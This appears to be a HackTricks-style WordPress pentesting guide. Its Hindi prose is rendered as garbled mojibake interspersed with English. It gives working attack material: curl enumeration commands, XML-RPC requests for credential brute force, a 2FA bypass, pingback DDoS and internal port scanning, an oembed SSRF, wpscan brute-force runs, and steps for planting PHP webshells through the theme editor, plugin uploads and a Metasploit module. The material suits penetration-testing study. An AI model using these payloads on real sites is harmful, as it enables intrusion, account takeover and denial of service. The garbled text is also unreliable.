# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА

- **Uploaded** рдлрд╝рд╛рдЗрд▓реЗрдВ рдЬрд╛рддреА рд╣реИрдВ: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк рдереАрдо рдХреА рдХреБрдЫ php рдмрджрд▓рдХрд░ RCE рд╣рд╛рд╕рд┐рд▓ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рд╕рдВрднрд╡рддрдГ рдЙрд╕ path рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: Using **theme twentytwelve** рдЖрдк **404.php** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **access** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** рдЖрдк рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ root рдкрд╛рд╕рд╡рд░реНрдб рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
- рдЬрд╛рдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд▓реЙрдЧрд┐рди рдкрде: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` рдореЗрдВ рдЙрдкрдпреЛрдЧреА рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИ рдЬреИрд╕реЗ рдХрд┐ WordPress рдХрд╛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╕рдВрд╕реНрдХрд░рдгред
- `wp-activate.php` рдХрд╛ рдЙрдкрдпреЛрдЧ рдирдП WordPress рд╕рд╛рдЗрдЯ рд╕реЗрдЯрдЕрдк рдХреЗ рджреМрд░рд╛рди рдИрдореЗрд▓ activation рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИред
- Login рдлрд╝реЛрд▓реНрдбрд░реНрд╕ (рдЫреБрдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╛рдо рдмрджрд▓реЗ рдЧрдП рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` рдПрдХ рдлрд╝рд╛рдЗрд▓ рд╣реИ рдЬреЛ WordPress рдХреА рдЙрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддреА рд╣реИ рдЬреЛ HTTP рдХреЛ transport mechanism рдХреЗ рд░реВрдк рдореЗрдВ рдФрд░ XML рдХреЛ encoding mechanism рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЗрдЯрд╛ рдХреЛ рдЯреНрд░рд╛рдВрд╕рдорд┐рдЯ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдмрдирд╛рддреА рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╕рдВрдЪрд╛рд░ WordPress [REST API](https://developer.wordpress.org/rest-api/reference) рджреНрд╡рд╛рд░рд╛ рдмрджрд▓ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
- `wp-content` рдлрд╝реЛрд▓реНрдбрд░ рдореБрдЦреНрдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ рдЬрд╣рд╛рдБ plugins рдФрд░ themes рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВред
- `wp-content/uploads/` рд╡рд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ рдЬрд╣рд╛рдБ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдкрд░ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдХреЛрдИ рднреА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИрдВред
- `wp-includes/` рдпрд╣ рд╡рд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ рдЬрд╣рд╛рдБ core рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИрдВ, рдЬреИрд╕реЗ certificates, fonts, JavaScript рдлрд╝рд╛рдЗрд▓реЗрдВ, рдФрд░ widgetsред
- `wp-sitemap.xml` WordPress рд╕рдВрд╕реНрдХрд░рдг 5.5 рдФрд░ рдЙрд╕рд╕реЗ рдКрдкрд░ рдореЗрдВ, Wordpress рд╕рднреА public рдкреЛрд╕реНрдЯ рдФрд░ publicly queryable post types рдФрд░ taxonomies рдХреЗ рд╕рд╛рде рдПрдХ sitemap XML рдлрд╝рд╛рдЗрд▓ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИред

**Post exploitation**

- `wp-config.php` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╡рд╣ рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ WordPress рдХреЛ database рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддреА рд╣реИ рдЬреИрд╕реЗ database name, database host, username рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб, authentication keys рдФрд░ salts, рдФрд░ database table prefixред рдЗрд╕ configuration рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ DEBUG рдореЛрдб рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ troubleshooting рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### Users Permissions

- **Administrator**
- **Editor**: рдЕрдкрдирд╛ рдФрд░ рджреВрд╕рд░реЛрдВ рдХреЗ рдкреЛрд╕реНрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ
- **Author**: рдЕрдкрдиреЗ рдкреЛрд╕реНрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ
- **Contributor**: рдЕрдкрдиреЗ рдкреЛрд╕реНрдЯ рд▓рд┐рдЦ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдЙрдиреНрд╣реЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛
- **Subscriber**: рдкреЛрд╕реНрдЯ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдкрдирд╛ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ

## **Passive Enumeration**

### **WordPress рд╕рдВрд╕реНрдХрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**

рдЬрд╛рдБрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдлрд╝рд╛рдЗрд▓реЗрдВ `/license.txt` рдпрд╛ `/readme.html` рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ

рдкреЗрдЬ рдХреЗ **source code** рдХреЗ рдЕрдВрджрд░ (рдЙрджрд╛рд╣рд░рдг from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS рд▓рд┐рдВрдХ рдлрд╝рд╛рдЗрд▓реЗрдВ

![](<../../images/image (533).png>)

- JavaScript рдлрд╝рд╛рдЗрд▓реЗрдВ

![](<../../images/image (524).png>)

### Plugins рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### рдереАрдо рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рд╕рдВрд╕реНрдХрд░рдг рдирд┐рдХрд╛рд▓реЗрдВ
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Active enumeration

### Plugins and Themes

рдЖрдк рд╕рдВрднрд╡рддрдГ рд╕рднреА Plugins рдФрд░ Themes рдвреВрдБрдв рдирд╣реАрдВ рдкрд╛рдПрдБрдЧреЗред рдЙрдиреНрд╣реЗрдВ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ **actively Brute Force a list of Plugins and Themes** рдХрд░рдирд╛ рд╣реЛрдЧрд╛ (рдЦреБрд╢реА рдХреА рдмрд╛рдд рд╣реИ рдХрд┐ рд╣рдорд╛рд░реЗ рд▓рд┐рдП рдХреБрдЫ automated tools рдореМрдЬреВрдж рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рдпреЗ lists рд╣реЛрддреА рд╣реИрдВ)ред

### Users

- **ID Brute:** рдЖрдк WordPress рд╕рд╛рдЗрдЯ рд╕реЗ рд╡реИрдз users Brute Forcing users IDs рдХреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
рдпрджрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ **200** рдпрд╛ **30X** рд╣реИрдВ, рддреЛ рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ id **рдорд╛рдиреНрдп** рд╣реИред рдпрджрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ **400** рд╣реИ, рддреЛ id **рдЕрдорд╛рдиреНрдп** рд╣реИред

- **wp-json:** рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд╡реЗрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
рдПрдХ рдФрд░ `/wp-json/` endpoint рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреБрдЫ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **рдХреЗрд╡рд▓ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рдПрдЧреА рдЬрд┐рдирдХреЗ рд▓рд┐рдП рдпрд╣ feature рд╕рдХреНрд╖рдо рд╣реИ**ред

Also note that **/wp-json/wp/v2/pages** IP addresses рдХреЛ leak рдХрд░ рд╕рдХрддрд╛ рд╣реИред

- **Login username enumeration**: рдЬрдм **`/wp-login.php`** рдкрд░ рд▓реЙрдЧрд┐рди рдХрд░рддреЗ рд╕рдордп **рд╕рдВрджреЗрд╢** рдЕрд▓рдЧ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдпрд╣ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИ рдХрд┐ **username рдореМрдЬреВрдж рд╣реИ рдпрд╛ рдирд╣реАрдВ**ред

### XML-RPC

рдпрджрд┐ `xml-rpc.php` рд╕рдХреНрд░рд┐рдп рд╣реИ рддреЛ рдЖрдк credentials рдкрд░ brute-force рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдиреНрдп resources рдкрд░ DoS attacks рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕ process рдХреЛ [using this](https://github.com/relarizky/wpxploit) рд╕реЗ automate рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**рдЬрд╛рдБрдЪреЗрдВ**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** рдпрд╛ **`metaWeblog.getUsersBlogs`** рдРрд╕реЗ рдХреБрдЫ рддрд░реАрдХреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ brute-force credentials рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдЖрдк рдЗрдирдореЗрдВ рд╕реЗ рдХреЛрдИ рднреА рдкрд╛ рд▓реЗрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдХреБрдЫ рдРрд╕рд╛ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
рдпрджрд┐ credentials рдЕрдорд╛рдиреНрдп рд╣реИрдВ рддреЛ 200 code response рдХреЗ рдЕрдВрджрд░ рд╕рдВрджреЗрд╢ _"Incorrect username or password"_ рджрд┐рдЦрд╛рдИ рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдПред

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

рд╕рд╣реА credentials рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдПрдХ file рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред response рдореЗрдВ path рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **рддреЗрдЬрд╝ рддрд░реАрдХрд╛** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

This method is meant for programs and not for humans, and old, therefore it doesn't support 2FA. So, if you have valid creds but the main entrance is protected by 2FA, **you might be able to abuse xmlrpc.php to login with those creds bypassing 2FA**. Note that you won't be able to perform all the actions you can do through the console, but you might still be able to get to RCE as Ippsec explains it in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **рд╣рдЬрд╝рд╛рд░реЛрдВ** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

рдпрджрд┐ рдЖрдкрдХреЛ **faultCode** рдХрд╛ рдорд╛рди **0** (17) рд╕реЗ **рдЕрдзрд┐рдХ** рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИред

рдкреВрд░реНрд╡ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ **`system.multicall`** рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЛ рджреЗрдЦреЗрдВ рддрд╛рдХрд┐ рдЖрдк рд╕реАрдЦ рд╕рдХреЗрдВ рдХрд┐ рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреИрд╕реЗ DDoS рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдЖрдо рддреМрд░ рдкрд░ Wordpress рд╕рд╛рдЗрдЯ рдХреА root рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ рдореМрдЬреВрдж рд╣реЛрддреА рд╣реИ: **`/wp-cron.php`**\
рдЬрдм рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ access рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдПрдХ **heavy** MySQL **query** рдЪрд▓рд╛рдИ рдЬрд╛рддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ **attackers** рджреНрд╡рд╛рд░рд╛ **DoS** рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `wp-cron.php` рдХреЛ рд╣рд░ page load рдкрд░ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬрдм рднреА рдХреЛрдИ client рдХрд┐рд╕реА Wordpress рдкреЗрдЬ рдХреЛ request рдХрд░рддрд╛ рд╣реИ), рдЬреЛ high-traffic рд╕рд╛рдЗрдЯреНрд╕ рдкрд░ рд╕рдорд╕реНрдпрд╛рдПрдБ рдкреИрджрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (DoS)ред

рд╕реБрдЭрд╛рд╡ рд╣реИ рдХрд┐ Wp-Cron рдХреЛ disable рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдП рдФрд░ host рдХреЗ рдЕрдВрджрд░ рдПрдХ real cronjob рдмрдирд╛рдпрд╛ рдЬрд╛рдП рдЬреЛ рдЖрд╡рд╢реНрдпрдХ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдирд┐рдпрдорд┐рдд рдЕрдВрддрд░рд╛рд▓ рдкрд░ рдЪрд▓рд╛рдП (рдмрд┐рдирд╛ рд╕рдорд╕реНрдпрд╛рдПрдБ рдкреИрджрд╛ рдХрд┐рдП)ред

### /wp-json/oembed/1.0/proxy - SSRF

рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдХрд┐ _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ рдкрд░ рдкрд╣реБрдБрдЪреЗрдВ рдФрд░ Worpress рд╕рд╛рдЗрдЯ рдЖрдкрдХреЗ рдкрд╛рд╕ request рдХрд░ рд╕рдХрддреА рд╣реИред

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

рдпрд╣ tool рдЬрд╛рдБрдЪрддрд╛ рд╣реИ рдХрд┐ **methodName: pingback.ping** рдФрд░ path **/wp-json/oembed/1.0/proxy** рдореМрдЬреВрдж рд╣реИрдВ рдпрд╛ рдирд╣реАрдВ рдФрд░ рдпрджрд┐ рдореМрдЬреВрдж рд╣реЛрдВ рддреЛ рдЗрдиреНрд╣реЗрдВ exploit рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## рдПрдХ рдмрд┐рдЯ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдХреЗ рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╣рдорд▓реЗ рд╕реЗ рдЕрдзрд┐рдХ рдпрд╣ рдПрдХ рдЬрд┐рдЬреНрдЮрд╛рд╕рд╛ рд╣реИред CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) рдореЗрдВ рдЖрдк рдХрд┐рд╕реА рднреА wordpress рдлрд╝рд╛рдЗрд▓ рдХрд╛ 1 рдмрд┐рдЯ flip рдХрд░ рд╕рдХрддреЗ рдереЗред рдЗрд╕рд▓рд┐рдП рдЖрдк рдлрд╝рд╛рдЗрд▓ `/var/www/html/wp-includes/user.php` рдХреЗ position `5389` рдХрд╛ рдмрд┐рдЯ flip рдХрд░рдХреЗ NOT (`!`) рдСрдкрд░реЗрд╢рди рдХреЛ NOP рдХрд░ рд╕рдХрддреЗ рдереЗред
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**рдереАрдо рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП php рдореЗрдВ рд╕рдВрд╢реЛрдзрди (admin credentials needed)**

Appearance тЖТ Theme Editor тЖТ 404 Template (at the right)

php shell рдХреЗ рд▓рд┐рдП рд╕рд╛рдордЧреНрд░реА рдмрджрд▓реЗрдВ:

![](<../../images/image (384).png>)

рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЦреЛрдЬреЗрдВ рдХрд┐ рдЖрдк рдЙрд╕ рдЕрдкрдбреЗрдЯреЗрдб рдкреЗрдЬ рддрдХ рдХреИрд╕реЗ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдкрдХреЛ рдпрд╣рд╛рдБ рдкрд╣реБрдБрдЪрдирд╛ рд╣реЛрдЧрд╛: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
Create your php backdoor using for example:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](<../../images/image (462).png>)

Access it and you will see the URL to execute the reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

рдпрд╣ рддрд░реАрдХрд╛ рдПрдХ рдРрд╕реЗ malicious plugin рдХреА installation рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЬреНрдЮрд╛рдд рд░реВрдк рд╕реЗ vulnerable рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ exploit рдХрд░рдХреЗ web shell рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ WordPress dashboard рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рдЬрд╛рддреА рд╣реИ:

1. **Plugin Acquisition**: plugin рдХреЛ рдХрд┐рд╕реА рд╕реНрд░реЛрдд рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреИрд╕реЗ Exploit DB рдЬреИрд╕реЗ [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress dashboard рдкрд░ рдЬрд╛рдПрдВ, рдлрд┐рд░ `Dashboard > Plugins > Upload Plugin` рдкрд░ рдЬрд╛рдПрдВред
- Download рдХрд┐рдпрд╛ рдЧрдпрд╛ plugin zip file рдЕрдкрд▓реЛрдб рдХрд░реЗрдВред
3. **Plugin Activation**: рдПрдХ рдмрд╛рд░ plugin рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ install рд╣реЛ рдЬрд╛рдиреЗ рдкрд░, рдЗрд╕реЗ dashboard рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдХреНрд░рд┐рдп рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред
4. **Exploitation**:
- рдЬрдм "reflex-gallery" plugin install рдФрд░ activate рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ exploit рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЬреНрдЮрд╛рдд рд░реВрдк рд╕реЗ vulnerable рд╣реИред
- Metasploit framework рдЗрд╕ vulnerability рдХреЗ рд▓рд┐рдП рдПрдХ exploit рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЙрдкрдпреБрдХреНрдд module рд▓реЛрдб рдХрд░рдХреЗ рдФрд░ рд╡рд┐рд╢рд┐рд╖реНрдЯ commands рдЪрд▓рд╛рдХрд░, meterpreter session рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ site рдкрд░ unauthorized access рджреЗрддрд╛ рд╣реИред
- рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ WordPress рд╕рд╛рдЗрдЯ рдХреЛ exploit рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЛрдВ рдореЗрдВ рд╕реЗ рдХреЗрд╡рд▓ рдПрдХ рд╣реИред

